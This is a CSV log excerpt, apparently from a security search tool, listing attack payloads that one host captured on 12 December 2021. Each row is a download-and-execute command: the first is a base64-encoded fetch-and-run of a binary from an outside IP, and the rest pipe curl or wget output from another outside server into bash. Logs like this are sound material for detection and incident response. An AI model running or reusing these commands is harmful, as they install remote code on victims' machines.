host,earliest,payload
dch1734pl5splnk,12/12/2021 21:05:13,"bash -c {echo,Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE1NS45NC4xNTQuMTcwL2FhYTtjdXJsIC1PIGh0dHA6Ly8xNTUuOTQuMTU0LjE3MC9hYWE7Y2htb2QgNzc3IGFhYTsuL2FhYQ==}|{base64,-d}|{bash,-i}"
dch1734pl5splnk,12/12/2021 23:38:48,(curl -s 195.54.160.149:5874/170.123.239.16:80||wget -q -O- 195.54.160.149:5874/170.123.239.16:80)|bash
dch1734pl5splnk,12/12/2021 23:39:06,(curl -s 195.54.160.149:5874/170.123.237.25:80||wget -q -O- 195.54.160.149:5874/170.123.237.25:80)|bash
dch1734pl5splnk,12/12/2021 23:39:43,(curl -s 195.54.160.149:5874/12.152.252.179:80||wget -q -O- 195.54.160.149:5874/12.152.252.179:80)|bash
dch1734pl5splnk,12/12/2021 23:40:08,(curl -s 195.54.160.149:5874/170.123.239.159:80||wget -q -O- 195.54.160.149:5874/170.123.239.159:80)|bash
dch1734pl5splnk,12/12/2021 23:40:42,(curl -s 195.54.160.149:5874/170.123.239.208:80||wget -q -O- 195.54.160.149:5874/170.123.239.208:80)|bash
dch1734pl5splnk,12/12/2021 23:40:51,(curl -s 195.54.160.149:5874/170.123.239.160:80||wget -q -O- 195.54.160.149:5874/170.123.239.160:80)|bash
dch1734pl5splnk,12/12/2021 23:41:23,(curl -s 195.54.160.149:5874/170.123.239.85:80||wget -q -O- 195.54.160.149:5874/170.123.239.85:80)|bash
dch1734pl5splnk,12/12/2021 23:42:54,(curl -s 195.54.160.149:5874/134.179.112.37:80||wget -q -O- 195.54.160.149:5874/134.179.112.37:80)|bash
dch1734pl5splnk,12/12/2021 23:43:22,(curl -s 195.54.160.149:5874/170.123.239.187:80||wget -q -O- 195.54.160.149:5874/170.123.239.187:80)|bash
dch1734pl5splnk,12/12/2021 23:44:39,(curl -s 195.54.160.149:5874/170.123.234.112:80||wget -q -O- 195.54.160.149:5874/170.123.234.112:80)|bash
dch1734pl5splnk,12/12/2021 23:44:53,(curl -s 195.54.160.149:5874/170.123.239.229:80||wget -q -O- 195.54.160.149:5874/170.123.239.229:80)|bash
dch1734pl5splnk,12/12/2021 23:45:06,(curl -s 195.54.160.149:5874/134.179.112.183:80||wget -q -O- 195.54.160.149:5874/134.179.112.183:80)|bash
dch1734pl5splnk,12/12/2021 23:45:30,(curl -s 195.54.160.149:5874/170.123.233.63:80||wget -q -O- 195.54.160.149:5874/170.123.233.63:80)|bash
dch1734pl5splnk,12/12/2021 23:45:33,(curl -s 195.54.160.149:5874/170.123.234.237:80||wget -q -O- 195.54.160.149:5874/170.123.234.237:80)|bash
dch1734pl5splnk,12/12/2021 23:45:37,(curl -s 195.54.160.149:5874/170.123.233.32:80||wget -q -O- 195.54.160.149:5874/170.123.233.32:80)|bash
dch1734pl5splnk,12/12/2021 23:45:38,(curl -s 195.54.160.149:5874/170.123.234.7:80||wget -q -O- 195.54.160.149:5874/170.123.234.7:80)|bash
dch1734pl5splnk,12/12/2021 23:45:56,(curl -s 195.54.160.149:5874/170.123.233.34:80||wget -q -O- 195.54.160.149:5874/170.123.233.34:80)|bash
dch1734pl5splnk,12/12/2021 23:46:06,(curl -s 195.54.160.149:5874/170.123.234.65:80||wget -q -O- 195.54.160.149:5874/170.123.234.65:80)|bash
dch1734pl5splnk,12/12/2021 23:46:44,(curl -s 195.54.160.149:5874/170.123.239.177:80||wget -q -O- 195.54.160.149:5874/170.123.239.177:80)|bash
dch1734pl5splnk,12/12/2021 23:48:00,(curl -s 195.54.160.149:5874/170.123.239.130:80||wget -q -O- 195.54.160.149:5874/170.123.239.130:80)|bash
dch1734pl5splnk,12/12/2021 23:48:57,(curl -s 195.54.160.149:5874/170.123.239.106:80||wget -q -O- 195.54.160.149:5874/170.123.239.106:80)|bash
dch1734pl5splnk,12/12/2021 23:49:26,(curl -s 195.54.160.149:5874/134.179.112.182:80||wget -q -O- 195.54.160.149:5874/134.179.112.182:80)|bash
dch1734pl5splnk,12/12/2021 23:49:33,(curl -s 195.54.160.149:5874/170.123.233.21:80||wget -q -O- 195.54.160.149:5874/170.123.233.21:80)|bash
dch1734pl5splnk,12/12/2021 23:49:45,(curl -s 195.54.160.149:5874/170.123.239.52:80||wget -q -O- 195.54.160.149:5874/170.123.239.52:80)|bash
dch1734pl5splnk,12/12/2021 23:49:47,(curl -s 195.54.160.149:5874/170.123.239.3:80||wget -q -O- 195.54.160.149:5874/170.123.239.3:80)|bash
dch1734pl5splnk,12/12/2021 23:50:04,(curl -s 195.54.160.149:5874/170.123.234.6:80||wget -q -O- 195.54.160.149:5874/170.123.234.6:80)|bash
dch1734pl5splnk,12/12/2021 23:50:17,(curl -s 195.54.160.149:5874/170.123.239.60:80||wget -q -O- 195.54.160.149:5874/170.123.239.60:80)|bash
dch1734pl5splnk,12/12/2021 23:50:53,(curl -s 195.54.160.149:5874/170.123.239.65:8080||wget -q -O- 195.54.160.149:5874/170.123.239.65:8080)|bash
dch1734pl5splnk,12/12/2021 23:52:46,(curl -s 195.54.160.149:5874/170.123.234.42:80||wget -q -O- 195.54.160.149:5874/170.123.234.42:80)|bash
dch1734pl5splnk,12/12/2021 23:53:33,(curl -s 195.54.160.149:5874/170.123.239.57:80||wget -q -O- 195.54.160.149:5874/170.123.239.57:80)|bash
dch1734pl5splnk,12/12/2021 23:53:37,(curl -s 195.54.160.149:5874/170.123.239.58:80||wget -q -O- 195.54.160.149:5874/170.123.239.58:80)|bash
dch1734pl5splnk,12/12/2021 23:54:11,(curl -s 195.54.160.149:5874/198.190.230.25:80||wget -q -O- 195.54.160.149:5874/198.190.230.25:80)|bash
dch1734pl5splnk,12/12/2021 23:54:58,(curl -s 195.54.160.149:5874/134.179.112.187:80||wget -q -O- 195.54.160.149:5874/134.179.112.187:80)|bash
dch1734pl5splnk,12/12/2021 23:54:59,(curl -s 195.54.160.149:5874/161.11.143.3:80||wget -q -O- 195.54.160.149:5874/161.11.143.3:80)|bash
